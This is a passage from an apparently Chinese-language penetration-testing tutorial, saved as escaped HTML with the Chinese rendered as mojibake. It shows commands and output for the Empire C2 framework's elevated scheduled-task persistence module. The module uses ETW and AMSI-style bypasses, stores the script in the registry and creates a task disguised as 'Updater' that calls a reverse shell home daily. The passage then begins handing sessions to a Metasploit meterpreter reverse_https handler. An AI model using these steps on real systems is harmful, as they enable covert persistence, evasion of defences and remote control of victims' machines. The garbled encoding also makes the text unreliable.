&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Name             â”‚ Value                               â”‚ Required â”‚ Description                         â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ ADSPath          â”‚                                     â”‚ False    â”‚ Alternate-data-stream location to   â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ store the script code.              â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Agent            â”‚ 45WYG2ZB                            â”‚ True     â”‚ Agent to run module on.             â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Bypasses         â”‚ mattifestation etw                  â”‚ False    â”‚ Bypasses as a space separated list  â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ to be prepended to the launcher.    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Cleanup          â”‚                                     â”‚ False    â”‚ Switch. Cleanup the trigger and any â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ script from specified location.     â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ DailyTime        â”‚ 14:26                               â”‚ False    â”‚ Daily &lt;span class=&#34;nb&#34;&gt;time&lt;/span&gt; to trigger the script    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HH:mm&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.                            â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ ExtFile          â”‚                                     â”‚ False    â”‚ Use an external file &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; the        â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ payload instead of a stager.        â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ IdleTime         â”‚                                     â”‚ False    â”‚ User idle &lt;span class=&#34;nb&#34;&gt;time&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;in minutes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; to      â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ trigger script.                     â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Listener         â”‚ &lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt;                                â”‚ False    â”‚ Listener to use.                    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Obfuscate        â”‚ False                               â”‚ False    â”‚ Switch. Obfuscate the launcher      â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ powershell code, uses the           â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ ObfuscateCommand &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; obfuscation    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ types. For powershell only.         â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ ObfuscateCommand â”‚ Token&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;ll&lt;span class=&#34;se&#34;&gt;\1&lt;/span&gt;                         â”‚ False    â”‚ The Invoke-Obfuscation &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; to   â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ use. Only used &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; Obfuscate switch  â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ is True. For powershell only.       â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ OnLogon          â”‚                                     â”‚ False    â”‚ Switch. Trigger script on user      â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ logon.                              â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Proxy            â”‚ default                             â”‚ False    â”‚ Proxy to use &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; request &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;default,  â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ none, or other&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.                    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ ProxyCreds       â”‚ default                             â”‚ False    â”‚ Proxy credentials                   â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ &lt;span class=&#34;o&#34;&gt;([&lt;/span&gt;domain&lt;span class=&#34;se&#34;&gt;\]&lt;/span&gt;username:password&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; to use â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; request &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;default, none, or      â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ other&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.                             â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ RegPath          â”‚ HKLM:&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;oftware&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;icrosoft&lt;span class=&#34;se&#34;&gt;\N&lt;/span&gt;etwork&lt;span class=&#34;se&#34;&gt;\d&lt;/span&gt;e â”‚ False    â”‚ Registry location to store the      â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚ bug                                 â”‚          â”‚ script code. Last element is the    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ key name.                           â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ TaskName         â”‚ Updater                             â”‚ True     â”‚ Name to use &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; the schtask.        â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ UserAgent        â”‚ default                             â”‚ False    â”‚ User-agent string to use &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; the    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ staging request &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;default, none, or  â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ other&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.                             â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usemodule/powershell/persistence/elevated/schtasks&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; DailyTime 14:26
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usemodule/powershell/persistence/elevated/schtasks&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; Listener &lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usemodule/powershell/persistence/elevated/schtasks&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; execute
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Tasked 45WYG2ZB to run Task &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Task &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; results received
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SUCCESS: The scheduled task &lt;span class=&#34;s2&#34;&gt;&amp;#34;Updater&amp;#34;&lt;/span&gt; has successfully been created.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Schtasks persistence established using listener &lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt; stored in HKLM:&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;oftware&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;icrosoft&lt;span class=&#34;se&#34;&gt;\N&lt;/span&gt;etwork&lt;span class=&#34;se&#34;&gt;\d&lt;/span&gt;ebug with Updater daily trigger at 14:26.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç­‰å¾…æŒ‡å®šæ—¶é—´å°±ä¼šæ‰§è¡Œè¿™è®¡åˆ’ä»»åŠ¡åå¼¹shellå›æ¥ã€‚&lt;/p&gt;
&lt;h3 id=&#34;ä¸metasploitè”åŠ¨&#34;&gt;ä¸Metasploitè”åŠ¨&lt;/h3&gt;
&lt;p&gt;è·ŸMSFå’ŒCSè”åŠ¨å·®ä¸å¤šï¼Œä¹Ÿå¯ä»¥æŠŠEmpireçš„shellåå¼¹åˆ°MSFä¸­ï¼Œä¸‹é¢æ¼”ç¤ºä½¿ç”¨,æˆ‘ä»¬å…ˆåœ¨msfä¸­è®¾ç½®ä¸€ä¸‹ä¿¡æ¯ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 &amp;gt; use exploit/multi/handler 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Using configured payload windows/x64/meterpreter/reverse_https
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; show options
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Module options &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;exploit/multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   Name  Current Setting  Required  Description
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   ----  ---------------  --------  -----------
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Payload options &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;windows/x64/meterpreter/reverse_https&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   Name      Current Setting  Required  Description
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   ----      ---------------  --------  -----------
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   EXITFUNC  process          yes       Exit technique &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Accepted: &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;, seh, thread, process, none&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   LHOST     172.16.0.107     yes       The &lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; listener hostname
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   LPORT     &lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt;             yes       The &lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; listener port
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   LURI                       no        The HTTP Path
